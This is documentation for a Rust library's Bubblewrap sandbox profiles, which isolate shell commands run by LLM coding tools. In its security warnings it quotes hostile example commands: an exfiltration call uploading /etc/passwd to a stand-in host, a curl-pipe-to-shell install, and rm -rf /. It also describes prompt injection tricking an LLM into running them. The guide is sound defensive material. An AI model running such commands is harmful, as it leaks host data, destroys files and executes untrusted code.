# Linux Sandbox Profiles

This guide covers the Bubblewrap-based Linux sandboxing provided by
`llm-coding-tools-bubblewrap` when the `linux-bubblewrap` feature is enabled.

## Why Sandboxing Matters

When an LLM runs shell commands, it can do anything the underlying process
is allowed to do: read secrets, delete files, make network requests to
exfiltrate data, and more.

Sandboxing puts the shell inside an isolated filesystem so that only the
paths you explicitly allow are visible, and network access can be turned
off entirely. This is enforced by the kernel.

This system is built on [bubblewrap][bwrap], a lightweight sandboxing tool
that uses Linux kernel namespaces. It is enabled via the `linux-bubblewrap`
Cargo feature flag and requires a Linux host with `bwrap` installed.

**Important:** the sandbox never silently falls back to host execution. If
`bwrap` is missing or unusable, you get an explicit error instead.

## The Two Profiles

There are two preset profiles, each designed for a different trust level.

### Public Bot

Use this profile when the LLM is handling **untrusted or hostile input**,
for example a Discord bot or any scenario where you don't fully trust the
prompts being sent.

Key characteristics:

- **Network disabled.** No outbound connections at all.
- **Minimal filesystem.** Starts from an empty view of the filesystem.
  Only selected system runtime roots, a writable workspace, and a synthetic
  home are visible.
- **Synthetic home.** A dedicated directory replaces the real home, so
  `~/.ssh` and other credential directories are never accessible.
- **Environment scrubbed.** All inherited variables are cleared and only
  a sanitized system `PATH` and `HOME` are set.
- **Resolved host shell.** Commands run via a visible system `bash` or
  fallback `sh`, not a home-directory or temp `PATH` entry.

### Trusted Maintenance

Use this profile for **trusted automation** like CI/CD pipelines, build
jobs, maintenance tasks, and similar workloads where you control the
inputs.

Key characteristics:

- **Network enabled.**
- **Full host `/` visible (read-only).**
- **Narrowed writable areas:** only the workspace, a synthetic home, a
  cache root, and a configurable sandbox `/tmp` backing.
- **`/etc/shadow` hidden** by a memory overlay.
- **Credential mounts** via `with_credential_file_mounts`, with validation
  that destinations stay within allowed directories.

> **Security warning:** this profile is not safe for untrusted input.
> Network access remains available and the full host filesystem is
> readable. For example, a malicious prompt could trick the LLM into
> running `curl https://example.com --upload-file /etc/passwd` to
> exfiltrate host data, or use `ip addr` to reveal your network
> configuration. Use this profile only for trusted inputs.

### Quick Comparison

| Aspect                 | Public Bot                                     | Trusted Maintenance                                   |
| ---------------------- | ---------------------------------------------- | ----------------------------------------------------- |
| **Use case**           | Untrusted / hostile input                      | Trusted automation (CI/CD, builds, etc.)              |
| **Network**            | Disabled (`--unshare-net`)                     | Enabled                                               |
| **Host filesystem**    | Minimal (bins, libs, workspace)                | Full `/` read-only                                    |
| **Writable paths**     | Workspace, synthetic home, configurable `/tmp` | Workspace, synthetic home, cache, configurable `/tmp` |
| **Home directory**     | Synthetic only                                 | Synthetic + `/home` tmpfs overlay                     |
| **`/etc` visible**     | No                                             | Yes (except `/etc/shadow` tmpfs overlay)              |
| **Environment**        | Cleared, sanitized system `PATH` + `HOME`      | Cleared, sanitized host `PATH` + XDG/build vars       |
| **Credential mounts**  | Not supported                                  | Supported (validated destinations)                    |
| **Cache root**         | Not mounted                                    | Optional writable bind                                |
| **Shell**              | Visible system `bash`/`sh`                     | Visible system `bash`/`sh`                            |
| **Safe for untrusted** | Yes                                            | No                                                    |

## How Sandboxing Works

The sandbox starts from an **empty filesystem view**. Nothing from the host
is visible unless explicitly mounted in. This section explains the
mechanics.

### Mount Types

Bubblewrap provides several ways to bring paths into the sandbox:

| Type           | Flag        | Effect                                                         |
| -------------- | ----------- | -------------------------------------------------------------- |
| Read-only bind | `--ro-bind` | Read-only access to a host path                                |
| Writable bind  | `--bind`    | Read-write access to a host path                               |
| Memory overlay | `--tmpfs`   | Writable directory backed by memory; hides anything underneath |
| Symlink        | `--symlink` | Creates a symlink inside the sandbox                           |

### Environment Isolation

The sandbox clears all inherited environment variables with `--clearenv`,
then rebuilds the environment using only explicitly allowed variables via
`--setenv`. This prevents secrets that might be in the parent process from
leaking into the sandbox.

### Network Isolation

The `--unshare-net` flag removes all network access inside the sandbox by
placing it in its own network namespace with no network interfaces. This
is used by the Public Bot profile and is a kernel-level isolation, not
just a firewall rule.

### Process Lifecycle

- `--die-with-parent`: the sandboxed process is killed if the parent
  process exits
- `--new-session`: creates a new process session for clean signal handling
- Configurable timeouts with buffered output preservation on kill

### LLM Awareness

When the sandbox has network disabled, the system prompt tells the LLM that
network access is unavailable, so it can adjust its behavior accordingly.

## Profile Details

### Public Bot

#### Mounts

| Path                                      | Type                  | Purpose                                                   |
| ----------------------------------------- | --------------------- | --------------------------------------------------------- |
| Selected system runtime roots (see below) | `--ro-bind`           | Common system shells, binaries, and libraries (read-only) |
| `/dev`                                    | `--dev`               | Device files (minimal set)                                |
| `/proc`                                   | `--proc`              | Process filesystem                                        |
| `/tmp`                                    | `--tmpfs` or `--bind` | Temporary files; RAM-backed or caller-managed host dir    |
| `/workspace`                              | `--bind`              | Working directory (writable)                              |
| `/home/sandbox`                           | `--bind`              | Synthetic home (writable)                                 |
| `/bin`, `/lib`, `/sbin` (when needed)     | `--symlink`           | Compatibility links into mounted system roots             |

System runtime roots are selected from the following paths when present:

- `/usr/bin`, `/usr/lib`, `/lib64`
- `/run/current-system/sw` (NixOS)
- `/nix/store`, `/nix/var/nix/profiles/default` (Nix)

#### Environment

| Variable | Value                                                                                                         |
| -------- | ------------------------------------------------------------------------------------------------------------- |
| `PATH`   | Sanitized system `PATH` derived from the host; excludes home, temp, wrapper, and per-user profile directories |
| `HOME`   | `/home/sandbox`                                                                                               |

#### Network

Disabled (`--unshare-net`).

#### Cache Root

Not mounted. A cache root is an optional host directory for storing build
artifacts and other reusable data between sandbox runs. The Public Bot
profile intentionally leaves it out so nothing persists across sessions.

#### Why These Mounts

- **System runtime roots**: mounted read-only so the resolved host shell
  plus common distro/Nix binaries remain available without exposing the
  full host root.
- **`/dev`, `/proc`, sandbox `/tmp`**: provide the minimum runtime surface
  for common tools.
- **Real home directory hidden**: prevents accidental secret disclosure
  from `~/.ssh` and similar directories.
- **`/etc` omitted**: avoids host-configuration coupling and credential
  exposure (no `/etc/passwd` visible).
- **Inherited env cleared**: prevents credential leakage through
  environment variables.
- **User-specific and volatile roots hidden**: minimizes attack surface
  and information disclosure while still allowing common system binaries.

Note: Commands that rely on paths like `/etc/alternatives`, `/opt`, or
per-user profile bins may still need explicit extra mounts.

### Trusted Maintenance

#### Mounts

| Path                     | Type                  | Purpose                                               |
| ------------------------ | --------------------- | ----------------------------------------------------- |
| `/`                      | `--ro-bind`           | Entire host `/` (read-only)                           |
| `/home`                  | `--tmpfs`             | Writable overlay (shadows real home)                  |
| `/etc/shadow`            | `--tmpfs`             | Shadowed (prevents password hash exposure)            |
| `/workspace`             | `--bind`              | Working directory (writable)                          |
| `/home/sandbox`          | `--bind`              | Synthetic home (writable)                             |
| `/cache` (if configured) | `--bind`              | Cache root (writable)                                 |
| `/dev`                   | `--dev`               | Device files                                          |
| `/proc`                  | `--proc`              | Process filesystem                                    |
| `/tmp`                   | `--tmpfs` or `--bind` | Temporary files on RAM or caller-managed host storage |

#### Environment

| Variable          | Value                                                      |
| ----------------- | ---------------------------------------------------------- |
| `PATH`            | Sanitized host `PATH` with hidden/volatile entries removed |
| `HOME`            | `/home/sandbox`                                            |
| `TMPDIR`          | `/tmp` (matches the configured sandbox tmp backing)        |
| `XDG_CACHE_HOME`  | `{cache_root}/xdg-cache`                                   |
| `XDG_CONFIG_HOME` | `/home/sandbox/.config`                                    |
| `XDG_STATE_HOME`  | `{cache_root}/xdg-state`                                   |

#### Network

Enabled by default.

#### Why These Mounts

- **Read-only host `/`**: keeps existing toolchains usable without
  rebinding every distro-specific path.
- **Writable state narrowed**: synthetic home, workspace, cache root, and
  memory overlays provide necessary write locations without exposing
  arbitrary host paths.
- **`/etc/shadow` shadowed**: password hashes are not exposed even though
  the rest of `/etc` remains visible for compatibility.
- **XDG directories set**: build tools use cache and state directories
  without polluting the synthetic home.

## Security Notes

### AllowedPathResolver Is Not a Shell Sandbox

[`AllowedPathResolver`][apr] only constrains structured file tools
(`read`, `write`, `edit`, `glob`, `grep`). It does **not** make shell
execution safe.

When the `bash` tool is enabled:

- An LLM can run arbitrary shell commands
- Commands can read, write, or delete any file the process has OS-level
  permissions for
- Examples: `cat /etc/passwd`, `rm -rf /`,
  `curl https://example.invalid/install.sh | sh`

If your threat model includes shell execution, use the Linux `bwrap`
sandbox profiles documented here, or disable shell execution entirely.

### Anti-Patterns to Avoid

These patterns weaken sandbox isolation:

- **Real home bind**: mounting the actual home directory exposes SSH keys
  and other secrets
- **Full credential-store mounts**: mounting `~/.ssh`,
  `~/.config/gcloud`, etc. defeats isolation
- **SSH agent forwarding**: socket forwarding bypasses filesystem
  restrictions entirely
- **Broad writable host roots**: writable binds to `/opt`, `/var`, etc.
  increase blast radius
- **Unnecessary env passthrough**: inheriting secrets via environment
  variables can leak them even with `--clearenv`

### Best Practices

For reproducibility and isolation:

1. **Use a synthetic home** (e.g., `/tmp/sandbox-home-{job-id}`) rather
   than the real home directory
2. **Mount cache roots explicitly** for build artifacts that should persist
   between runs
3. **Set `XDG_CACHE_HOME` and `XDG_STATE_HOME`** to cache-appropriate
   locations inside the sandbox

## Pre-Deployment Checklist

Before going into production, verify the following on your target host.
The library handles things like synthetic home setup, environment
scrubbing, and visible system-shell resolution for you. These checks cover what
depends on your environment.

### Host

- [ ] `bwrap` is installed and on `PATH`
- [ ] Kernel user namespaces are available (check
  `sysctl kernel.unprivileged_userns_clone` if applicable)

### Public Bot

- [ ] No outbound network connections are possible
- [ ] No host credentials are accessible inside the sandbox
- [ ] Writes outside the workspace go to tmpfs, not the host

### Trusted Maintenance

- [ ] Cache and build output directories work correctly on your host
- [ ] No unintended host paths are writable from inside the sandbox

[bwrap]: https://github.com/containers/bubblewrap
[apr]: https://docs.rs/llm-coding-tools-core/latest/llm_coding_tools_core/struct.AllowedPathResolver.html
